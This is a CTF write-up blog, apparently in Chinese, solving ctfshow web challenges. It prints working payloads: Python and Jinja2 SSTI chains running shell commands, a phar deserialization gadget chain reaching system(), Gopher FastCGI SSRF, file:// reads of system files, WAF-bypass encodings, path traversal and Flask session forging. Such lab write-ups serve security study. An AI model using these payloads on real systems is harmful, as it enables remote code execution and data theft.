<h2 id="1024-WEB签到"><a href="#1024-WEB签到" class="headerlink" title="1024_WEB签到"></a>1024_WEB签到</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">call_user_func($_GET[&#x27;f&#x27;]);</span><br></pre></td></tr></table></figure>

<p>可见是没有参数能传入的，也没法无参rce</p>
<p>直接去phpinfo找</p>
<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/202402181626490.png" alt="image-20240218162630417"></p>
<p>调用就行</p>
<h2 id="1024-fastapi"><a href="#1024-fastapi" class="headerlink" title="1024_fastapi"></a>1024_fastapi</h2><p>fastapi，dirsearch扫出手册<code>/docs</code></p>
<p>由python写出来的后端，尝试有回显的函数<code>str(123)</code>返回<code>123</code></p>
<p>尝试ssti</p>
<p><a href="https://xz.aliyun.com/t/6885">Python模板注入(SSTI)深入学习</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">q=str(&quot;&quot;.__class__.__bases__[0].__subclasses__()[127].__init__.__globals__[&#x27;po&#x27;+&#x27;pen&#x27;](&#x27;cat /mnt/f1a9&#x27;).read())</span><br></pre></td></tr></table></figure>

<p>先读源码<code>main.py</code>，提示flag位置，还ban了一些</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;import&#x27;,&#x27;open&#x27;,&#x27;eval&#x27;,&#x27;exec&#x27;</span><br></pre></td></tr></table></figure>

<h2 id="1024-柏拉图"><a href="#1024-柏拉图" class="headerlink" title="1024_柏拉图"></a>1024_柏拉图</h2><p>首页要求输入url，试了<code>http</code>协议报错，试到<code>file</code>协议不报错，后面是双写绕过</p>
<p>读一下源文件</p>
<p>index.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-10-19 20:09:22</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-10-19 21:31:48</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line">*/</span><br><span class="line">function curl($url)&#123;  </span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, 0);</span><br><span class="line">    echo curl_exec($ch);</span><br><span class="line">    curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&#x27;url&#x27;]))&#123;</span><br><span class="line">    $url = $_GET[&#x27;url&#x27;];</span><br><span class="line">    $bad = &#x27;file://&#x27;;</span><br><span class="line">    if(preg_match(&#x27;/dict|127|localhost|sftp|Gopherus|http|\.\.\/|flag|[0-9]/is&#x27;, $url,$match))</span><br><span class="line">		&#123;</span><br><span class="line">			die(&#x27;难道我不知道你在想什么？除非绕过我？！&#x27;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">      $url=str_replace($bad,&quot;&quot;,$url);</span><br><span class="line">      curl($url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>upload.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_FILES[&quot;file&quot;]))&#123;</span><br><span class="line">if (($_FILES[&quot;file&quot;][&quot;type&quot;]==&quot;image/gif&quot;)&amp;&amp;(substr($_FILES[&quot;file&quot;][&quot;name&quot;], strrpos($_FILES[&quot;file&quot;][&quot;name&quot;], &#x27;.&#x27;)+1))== &#x27;gif&#x27;) &#123;</span><br><span class="line"></span><br><span class="line">    if (file_exists(&quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]))&#123;</span><br><span class="line">      echo $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot; 文件已经存在啦！&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">      move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload/&quot; .$_FILES[&quot;file&quot;][&quot;name&quot;]);</span><br><span class="line">      echo &quot;文件存储在: &quot; . &quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">      echo &quot;这个文件我不喜欢，我喜欢一个gif的文件&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>readfile.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include(&#x27;class.php&#x27;);</span><br><span class="line">function check($filename)&#123;  </span><br><span class="line">    if (preg_match(&quot;/^phar|^smtp|^dict|^zip|file|etc|root|filter|\.\.\//i&quot;,$filename))&#123;</span><br><span class="line">        die(&quot;姿势太简单啦，来一点骚的？！&quot;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&#x27;filename&#x27;]))&#123;</span><br><span class="line">    $file=$_GET[&#x27;filename&#x27;];</span><br><span class="line">        if(strstr($file, &quot;flag&quot;) || check($file) || strstr($file, &quot;php&quot;)) &#123;</span><br><span class="line">            die(&quot;这么简单的获得不可能吧？！&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        echo readfile($file);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>class.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">class A &#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public function __construct($a)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;a = $a;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;THI IS CTFSHOW&quot;.$this-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class B &#123;</span><br><span class="line">    public $b;</span><br><span class="line">    public function __construct($b)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;b = $b;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        return ($this-&gt;b)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class C&#123;</span><br><span class="line">    public $c;</span><br><span class="line">    public function __construct($c)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;c = $c;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()</span><br><span class="line">    &#123;</span><br><span class="line">        return eval($this-&gt;c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>unlink.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$file=$_GET[&#x27;filename&#x27;];</span><br><span class="line">function check($file)&#123;  </span><br><span class="line">  if (preg_match(&quot;/\.\.\//i&quot;,$file))&#123;</span><br><span class="line">      die(&quot;你想干什么？！&quot;);</span><br><span class="line">  &#125;else&#123;</span><br><span class="line">      return $file;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">if(file_exists(&quot;upload/&quot;.$file))&#123;</span><br><span class="line">      if(unlink(&quot;upload/&quot;.check($file)))&#123;</span><br><span class="line">          echo &quot;删除&quot;.$file.&quot;成功！&quot;;</span><br><span class="line">      &#125;else&#123;</span><br><span class="line">          echo &quot;删除&quot;.$file.&quot;失败！&quot;;</span><br><span class="line">      &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &#x27;要删除的文件不存在！&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>看到有个<code>class.php</code>和<code>readfile</code>函数，一眼phar反序列化</p>
<p><a href="https://xz.aliyun.com/t/6699">php反序列化拓展攻击详解–phar</a></p>
<p>poc.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A &#123;</span><br><span class="line">    public $a;</span><br><span class="line">//    public function __construct($a)</span><br><span class="line">//    &#123;</span><br><span class="line">//        $this-&gt;a = $a;</span><br><span class="line">//    &#125;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;THI IS CTFSHOW&quot;.$this-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class B &#123;</span><br><span class="line">    public $b;</span><br><span class="line">//    public function __construct($b)</span><br><span class="line">//    &#123;</span><br><span class="line">//        $this-&gt;b = $b;</span><br><span class="line">//    &#125;</span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        return ($this-&gt;b)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class C&#123;</span><br><span class="line">    public $c;</span><br><span class="line">//    public function __construct($c)</span><br><span class="line">//    &#123;</span><br><span class="line">//        $this-&gt;c = $c;</span><br><span class="line">//    &#125;</span><br><span class="line">    public function __invoke()</span><br><span class="line">    &#123;</span><br><span class="line">        return eval($this-&gt;c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$A = new A(&#x27;&#x27;);</span><br><span class="line">$B = new B(&#x27;&#x27;);</span><br><span class="line">$C = new C(&#x27;&#x27;);</span><br><span class="line">$A-&gt;a = $B;</span><br><span class="line">$B-&gt;b = $C;</span><br><span class="line">$C-&gt;c = &#x27;system(&quot;cat /ctfshow_1024_flag.txt&quot;);&#x27;;</span><br><span class="line">$phar = new Phar(&#x27;cat.phar&#x27;);</span><br><span class="line">$phar -&gt; stopBuffering();</span><br><span class="line">$phar -&gt; setStub(&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;);</span><br><span class="line">$phar -&gt; addFromString(&#x27;test.txt&#x27;,&#x27;test&#x27;);</span><br><span class="line">$phar -&gt; setMetadata($A);</span><br><span class="line">$phar -&gt; stopBuffering();</span><br></pre></td></tr></table></figure>

<p>上传直接用<code>compress.zlib://phar://</code>读</p>
<h2 id="1024-图片代理"><a href="#1024-图片代理" class="headerlink" title="1024_图片代理"></a>1024_图片代理</h2><p>自动跳转</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?picurl=aHR0cDovL3AucWxvZ28uY24vZ2gvMzcyNjE5MDM4LzM3MjYxOTAzOC8w</span><br></pre></td></tr></table></figure>

<p>base64解码是个图片地址，直接换用<code>file</code>协议能读<code>passwd</code></p>
<p>嗅探到nginx，读一下配置文件<code>/etc/nginx/conf.d/default.conf</code></p>
<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/202402201750089.png" alt="image-20240220175037927"></p>
<p>网站目录<code>/var/www/bushihtml</code>，fastcgi开在9000端口</p>
<p>直接gopher打</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python gopherus.py --exploit fastcgi</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/202402201751079.png" alt="image-20240220175154791"></p>
<h2 id="1024-hello-world"><a href="#1024-hello-world" class="headerlink" title="1024_hello_world"></a>1024_hello_world</h2><p>看起来像ssti，fuzz一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[&quot;&#x27;&quot;, &#x27;.&#x27;, &#x27;_&#x27;, &#x27;\r&#x27;, &#x27;\x0b&#x27;, &#x27;\x0c&#x27;, &#x27;&#123;&#123;&#x27;]</span><br></pre></td></tr></table></figure>

<p>被ban了就没法直接打回显了</p>
<p>但是可以用<code>&#123;%print(...)%&#125;</code>代替</p>
<p>也有更麻烦的用<code>&#123;% if ... %&#125;1&#123;% endif %&#125;</code>盲注</p>
<p>这里选用<code>&#123;%print(...)%&#125;</code></p>
<p><a href="https://xz.aliyun.com/t/9584">以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">key=&#123;%print(()[&quot;\x5f\x5fclass\x5f\x5f&quot;][&quot;\x5f\x5fbase\x5f\x5f&quot;][&quot;\x5f\x5fsubclasses\x5f\x5f&quot;]()[117][&quot;\x5f\x5finit\x5f\x5f&quot;][&quot;\x5f\x5fglobals\x5f\x5f&quot;][&quot;popen&quot;](&quot;cat /c*&quot;)[&quot;read&quot;]())%&#125;</span><br><span class="line"></span><br><span class="line">&#x27;_&#x27;hex编码-&gt;&#x27;\x5f&#x27;，也可以换用unicode</span><br></pre></td></tr></table></figure>

<p>主要就是用<code>()[&quot;\x5f\x5fclass\x5f\x5f&quot;]</code>来代替<code>().__class__</code></p>
<h2 id="原谅4"><a href="#原谅4" class="headerlink" title="原谅4"></a>原谅4</h2><p>看起来很简单</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php isset($_GET[&#x27;xbx&#x27;])?system($_GET[&#x27;xbx&#x27;]):highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>

<p>但是进去才知道命令基本不可用，<code>bin</code>里面只有<code>ls rm sh</code>这三条命令可用</p>
<p>但是还有一种利用报错读取来读到文件内容</p>
<p>如果有<strong>读取文件</strong>的权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo `. /f* 2&gt;&amp;1` -urlencode&gt; echo `. /f* 2&gt;%261`</span><br></pre></td></tr></table></figure>

<p>如果有<strong>执行文件</strong>的权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo `/f* 2&gt;&amp;1` -urlencode&gt; echo `/f* 2&gt;%261`</span><br></pre></td></tr></table></figure>

<p>无非就是一个用了<code>sh</code>执行shell脚本的区别</p>
<h2 id="原谅5-fastapi2"><a href="#原谅5-fastapi2" class="headerlink" title="原谅5_fastapi2"></a>原谅5_fastapi2</h2><p>严格意义来说不是ssti，fuzz一下，过滤了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[&#x27;import&#x27;, &#x27;open&#x27;, &#x27;eval&#x27;, &#x27;exec&#x27;, &#x27;class&#x27;, &#x27;&#x27;&#x27;, &#x27;&quot;&#x27;, &#x27;vars&#x27;, &#x27;str&#x27;, &#x27;chr&#x27;]</span><br></pre></td></tr></table></figure>

<p>除了之前用的<code>str</code>可以造成回显，<code>list</code>同样也可以打出回显</p>
<p>可以直接用<code>list(globals())</code>看到当前的全局变量</p>
<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/202402221531945.png" alt="image-20240222153114837"></p>
<p>比较特殊的就是其中的<code>youdontknow</code>，直接进去看就能知道这是banlist</p>
<p>而且属性应该是list</p>
<p>列表有一个函数操作是<code>[].clear()</code>，可以清空该列表内元素</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">q=youdontknow.clear()</span><br><span class="line">q=list(youdontknow)</span><br></pre></td></tr></table></figure>

<p>可见banlist已经被清空了，接下来就是随便打</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">q=[].__class__.__bases__[0].__subclasses__()[127].__init__.__globals__[&#x27;popen&#x27;](&#x27;cat /f*&#x27;).read()</span><br><span class="line">q=open(&quot;/flag&quot;).read()</span><br></pre></td></tr></table></figure>

<h3 id="其他方法"><a href="#其他方法" class="headerlink" title="其他方法"></a>其他方法</h3><blockquote>
<p>由于规定了接收的q是string型，因此<code>&quot;&quot;.__class__</code>这类返回的class类型就会引起错误，因此需要将其转为str型</p>
<p>可以<strong>通过<code>bytes.fromhex()</code>绕过waf，同时也可以保证str型</strong>。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">q=__impｏrt__(bytes.fromhex(hex(28531)[2:]).decode()).pｏpen(bytes.fromhex(hex(6c73)[2:]).decode()).readlines()</span><br><span class="line">其中的ｏ是全角字符,可以绕过waf</span><br><span class="line">28531和6c73分别是os,ls的hex</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/202402221548773.png" alt="image-20240222154818718"></p>
<p>还有种比较抽象的办法</p>
<p>有一个内置函数没有被ban：<code>dir()</code>，用来查看当前范围内变量</p>
<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/202402221804818.png" alt="image-20240222180447783"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">q=kiword</span><br></pre></td></tr></table></figure>

<p>可见最后的kiword是<code>chr</code></p>
<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/202402221805629.png" alt="image-20240222180522602"></p>
<p>就可以利用<code>getattr</code>拼凑出函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">getattr(__builtins__,kiword)-&gt;__builtins__.chr</span><br><span class="line">getattr(__builtins__,kiword)(97)-&gt;__builtins__.chr(97)-&gt;a</span><br></pre></td></tr></table></figure>

<p>可以拼出<code>__builtins__.__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">getattr(__builtins__,kiword)(95)+getattr(__builtins__,kiword)(95)+getattr(__builtins__,kiword)(105)+getattr(__builtins__,kiword)(109)+getattr(__builtins__,kiword)(112)+getattr(__builtins__,kiword)(111)+getattr(__builtins__,kiword)(114)+getattr(__builtins__,kiword)(116)+getattr(__builtins__,kiword)(95)+getattr(__builtins__,kiword)(95)</span><br><span class="line">-&gt;</span><br><span class="line">__import__</span><br><span class="line"></span><br><span class="line">getattr(__builtins__,kiword)(111)+getattr(__builtins__,kiword)(115)</span><br><span class="line">-&gt;</span><br><span class="line">os</span><br><span class="line"></span><br><span class="line">getattr(__builtins__,kiword)(112)+getattr(__builtins__,kiword)(111)+getattr(__builtins__,kiword)(112)+getattr(__builtins__,kiword)(101)+getattr(__builtins__,kiword)(110)</span><br><span class="line">-&gt;</span><br><span class="line">popen</span><br><span class="line"></span><br><span class="line">getattr(__builtins__,kiword)(108)+getattr(__builtins__,kiword)(115)</span><br><span class="line">-&gt;</span><br><span class="line">ls</span><br><span class="line"></span><br><span class="line">payload:</span><br><span class="line"></span><br><span class="line">getattr(getattr(__builtins__,getattr(__builtins__,kiword)(95)+getattr(__builtins__,kiword)(95)+getattr(__builtins__,kiword)(105)+getattr(__builtins__,kiword)(109)+getattr(__builtins__,kiword)(112)+getattr(__builtins__,kiword)(111)+getattr(__builtins__,kiword)(114)+getattr(__builtins__,kiword)(116)+getattr(__builtins__,kiword)(95)+getattr(__builtins__,kiword)(95))(getattr(__builtins__,kiword)(111)+getattr(__builtins__,kiword)(115)),getattr(__builtins__,kiword)(112)+getattr(__builtins__,kiword)(111)+getattr(__builtins__,kiword)(112)+getattr(__builtins__,kiword)(101)+getattr(__builtins__,kiword)(110))(getattr(__builtins__,kiword)(108)+getattr(__builtins__,kiword)(115)).read()</span><br><span class="line"></span><br><span class="line">-urlencode&gt;</span><br><span class="line"></span><br><span class="line">getattr(getattr(__builtins__%2Cgetattr(__builtins__%2Ckiword)(95)%2Bgetattr(__builtins__%2Ckiword)(95)%2Bgetattr(__builtins__%2Ckiword)(105)%2Bgetattr(__builtins__%2Ckiword)(109)%2Bgetattr(__builtins__%2Ckiword)(112)%2Bgetattr(__builtins__%2Ckiword)(111)%2Bgetattr(__builtins__%2Ckiword)(114)%2Bgetattr(__builtins__%2Ckiword)(116)%2Bgetattr(__builtins__%2Ckiword)(95)%2Bgetattr(__builtins__%2Ckiword)(95))(getattr(__builtins__%2Ckiword)(111)%2Bgetattr(__builtins__%2Ckiword)(115))%2Cgetattr(__builtins__%2Ckiword)(112)%2Bgetattr(__builtins__%2Ckiword)(111)%2Bgetattr(__builtins__%2Ckiword)(112)%2Bgetattr(__builtins__%2Ckiword)(101)%2Bgetattr(__builtins__%2Ckiword)(110))(getattr(__builtins__%2Ckiword)(100)%2Bgetattr(__builtins__%2Ckiword)(105)%2Bgetattr(__builtins__%2Ckiword)(114)).read()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow菜狗杯</title>
    <url>/2024/01/07/%E8%8F%9C%E7%8B%97%E6%9D%AF/</url>
    <content><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="web签到"><a href="#web签到" class="headerlink" title="web签到"></a>web签到</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eval($_REQUEST[$_GET[$_POST[$_COOKIE[&#x27;CTFshow-QQ群:&#x27;]]]][6][0][7][5][8][0][9][4][4]);</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309091656155.png" alt="image-20230909165613083"></p>
<h2 id="web2-c0me-t0-s1gn"><a href="#web2-c0me-t0-s1gn" class="headerlink" title="web2 c0me_t0_s1gn"></a>web2 c0me_t0_s1gn</h2><p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309091708112.png" alt="image-20230909170813094"></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309091708492.png" alt="image-20230909170819468"></p>
<h2 id="我的眼里只有"><a href="#我的眼里只有" class="headerlink" title="我的眼里只有$"></a>我的眼里只有$</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$_</span>);</span><br></pre></td></tr></table></figure>

<p>extract():将数组中变量导入到符号表，extract(array(“a” &#x3D;&gt; “Cat”))等价于$a&#x3D;”Cat”</p>
<p>传入POST的时候本来就会将POST内容作为数组传入，本质其实就是</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$arr</span> = [<span class="string">&quot;_&quot;</span>=&gt;<span class="string">&quot;a&quot;</span>,<span class="string">&quot;a&quot;</span>=&gt;<span class="string">&quot;b&quot;</span>,<span class="string">&quot;b&quot;</span>=&gt;<span class="string">&quot;c&quot;</span>,<span class="string">&quot;c&quot;</span>=&gt;<span class="string">&quot;d&quot;</span>,<span class="string">&quot;d&quot;</span>=&gt;<span class="string">&quot;e&quot;</span>,<span class="string">&quot;e&quot;</span>=&gt;<span class="string">&quot;f&quot;</span>,<span class="string">&quot;f&quot;</span>=&gt;<span class="string">&quot;g&quot;</span>,<span class="string">&quot;g&quot;</span>=&gt;<span class="string">&quot;h&quot;</span>,<span class="string">&quot;h&quot;</span>=&gt;<span class="string">&quot;i&quot;</span>,<span class="string">&quot;i&quot;</span>=&gt;<span class="string">&quot;j&quot;</span>,<span class="string">&quot;j&quot;</span>=&gt;<span class="string">&quot;k&quot;</span>,<span class="string">&quot;k&quot;</span>=&gt;<span class="string">&quot;l&quot;</span>,<span class="string">&quot;l&quot;</span>=&gt;<span class="string">&quot;m&quot;</span>,<span class="string">&quot;m&quot;</span>=&gt;<span class="string">&quot;n&quot;</span>,<span class="string">&quot;n&quot;</span>=&gt;<span class="string">&quot;o&quot;</span>,<span class="string">&quot;o&quot;</span>=&gt;<span class="string">&quot;p&quot;</span>,<span class="string">&quot;p&quot;</span>=&gt;<span class="string">&quot;q&quot;</span>,<span class="string">&quot;q&quot;</span>=&gt;<span class="string">&quot;r&quot;</span>,<span class="string">&quot;r&quot;</span>=&gt;<span class="string">&quot;s&quot;</span>,<span class="string">&quot;s&quot;</span>=&gt;<span class="string">&quot;t&quot;</span>,<span class="string">&quot;t&quot;</span>=&gt;<span class="string">&quot;u&quot;</span>,<span class="string">&quot;u&quot;</span>=&gt;<span class="string">&quot;v&quot;</span>,<span class="string">&quot;v&quot;</span>=&gt;<span class="string">&quot;w&quot;</span>,<span class="string">&quot;w&quot;</span>=&gt;<span class="string">&quot;x&quot;</span>,<span class="string">&quot;x&quot;</span>=&gt;<span class="string">&quot;y&quot;</span>,<span class="string">&quot;y&quot;</span>=&gt;<span class="string">&quot;z&quot;</span>,<span class="string">&quot;z&quot;</span>=&gt;<span class="string">&quot;aa&quot;</span>,<span class="string">&quot;aa&quot;</span>=&gt;<span class="string">&quot;bb&quot;</span>,<span class="string">&quot;bb&quot;</span>=&gt;<span class="string">&quot;cc&quot;</span>,<span class="string">&quot;cc&quot;</span>=&gt;<span class="string">&quot;dd&quot;</span>,<span class="string">&quot;dd&quot;</span>=&gt;<span class="string">&quot;xx&quot;</span>,<span class="string">&quot;xx&quot;</span>=&gt;<span class="string">&quot;yy&quot;</span>,<span class="string">&quot;yy&quot;</span>=&gt;<span class="string">&quot;ta&quot;</span>,<span class="string">&quot;ta&quot;</span>=&gt;<span class="string">&quot;ad&quot;</span>,<span class="string">&quot;ad&quot;</span>=&gt;<span class="string">&quot;bba&quot;</span>,<span class="string">&quot;bba&quot;</span>=&gt;<span class="string">&quot;sh&quot;</span>,<span class="string">&quot;sh&quot;</span>=&gt;<span class="string">&quot;ls&quot;</span>]</span><br></pre></td></tr></table></figure>

<p>太麻烦了，写个爆破脚本，由于php中变量名开头必须是字母或者_，就手动加一下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> request</span><br><span class="line">url = <span class="string">&quot;http://localhost:9090/&quot;</span></span><br><span class="line">data = <span class="string">&quot;_=_0&amp;&quot;</span></span><br><span class="line">code = <span class="string">&quot;_34=system(&#x27;cat /f*&#x27;)&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">34</span>):</span><br><span class="line">    data = data + <span class="string">&quot;_&quot;</span> +<span class="built_in">str</span>(i) + <span class="string">&quot;=&quot;</span> + <span class="string">&quot;_&quot;</span> + <span class="built_in">str</span>(i+<span class="number">1</span>) + <span class="string">&quot;&amp;&quot;</span></span><br><span class="line">data = data + code</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line">r = requests.post(url=url,data=data)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>

<p>结果就是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?_=_0&amp;_0=_1&amp;_1=_2&amp;_2=_3&amp;_3=_4&amp;_4=_5&amp;_5=_6&amp;_6=_7&amp;_7=_8&amp;_8=_9&amp;_9=_10&amp;_10=_11&amp;_11=_12&amp;_12=_13&amp;_13=_14&amp;_14=_15&amp;_15=_16&amp;_16=_17&amp;_17=_18&amp;_18=_19&amp;_19=_20&amp;_20=_21&amp;_21=_22&amp;_22=_23&amp;_23=_24&amp;_24=_25&amp;_25=_26&amp;_26=_27&amp;_27=_28&amp;_28=_29&amp;_29=_30&amp;_30=_31&amp;_31=_32&amp;_32=_33&amp;_33=_34&amp;_34=system(&quot;cat /f*&quot;);</span><br></pre></td></tr></table></figure>

<h2 id="抽老婆"><a href="#抽老婆" class="headerlink" title="抽老婆"></a>抽老婆</h2><p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309091810331.png" alt="image-20230909181013311"></p>
<p>一眼路径，随便试一下有报错app.py</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309091810892.png" alt="image-20230909181033871"></p>
<p>&#x2F;download?file&#x3D;..&#x2F;..&#x2F;app.py拿到源代码+sk，直接session伪造</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 flask_session_cookie_manager3.py encode -s &#x27;tanji_is_A_boy_Yooooooooooooooooooooo!&#x27; -t &#x27;&#123;&quot;isadmin&quot;:&quot;True&quot;&#125;&#x27; </span><br></pre></td></tr></table></figure>

<h2 id="一言既出"><a href="#一言既出" class="headerlink" title="一言既出"></a>一言既出</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>] == <span class="number">114514</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">assert</span>(<span class="string">&quot;intval(<span class="subst">$_GET</span>[num])==1919810&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;一言既出，驷马难追!&quot;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>学到了，弱比较比较数字，只会比对单数字的部分，assert里可以直接视作php语句，所以可以用);&#x2F;&#x2F;闭合然后把后面的die注释掉</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?num=114514);//</span><br></pre></td></tr></table></figure>

